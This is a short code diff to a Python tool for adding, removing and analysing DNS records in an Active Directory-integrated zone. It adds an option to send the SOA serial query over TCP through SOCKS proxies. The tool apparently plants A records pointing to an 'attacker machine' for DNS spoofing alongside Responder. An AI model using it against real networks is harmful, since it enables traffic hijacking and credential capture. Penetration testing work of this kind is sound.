@@ -48,14 +48,14 @@ class DNS_RPC_RECORD_TS(Structure):
         ('entombedTime', '<Q'),
     )
 
-def getserial(server, zone):
+def getserial(server, zone, tcp):
     dnsresolver = dns.resolver.Resolver()
     try:
         socket.inet_aton(server)
         dnsresolver.nameservers = [server]
     except socket.error:
         pass
-    res = dnsresolver.query(zone, 'SOA')
+    res = dnsresolver.query(zone, 'SOA', tcp=tcp)
     for answer in res:
         return answer.serial + 1
 
@@ -77,6 +77,7 @@ parser.add_argument("-p","--password",type=str,help="Password or LM:NTLM hash, w
 parser.add_argument("-a", "--action", type=str, help="ad, rm, or an: add, remove, analyze")
 parser.add_argument("-r", "--record", type=str, help="DNS record name")
 parser.add_argument("-d", "--data", help="The IP address of attacker machine")
+parser.add_argument("-t", "--dns-tcp", action="store_true", help="Perform DNS SOA query via TCP (recommended usage through socks proxies)")
 parser.add_argument("-l", "--logfile", type=str, help="The log file of Responder in analyze mode")
 
 
@@ -148,7 +149,7 @@ if recordname.lower().endswith(zone.lower()):
 record_dn = 'DC=%s,DC=%s,%s' % (recordname, zone, dnsroot)
 
 if args.action == 'ad':
-    record = new_A_record(1, getserial(args.DNS, zone))
+    record = new_A_record(1, getserial(args.DNS, zone, tcp=args.dns_tcp))
     record['Data'] = DNS_RPC_RECORD_A()
     record['Data'] = socket.inet_aton(args.data)
 
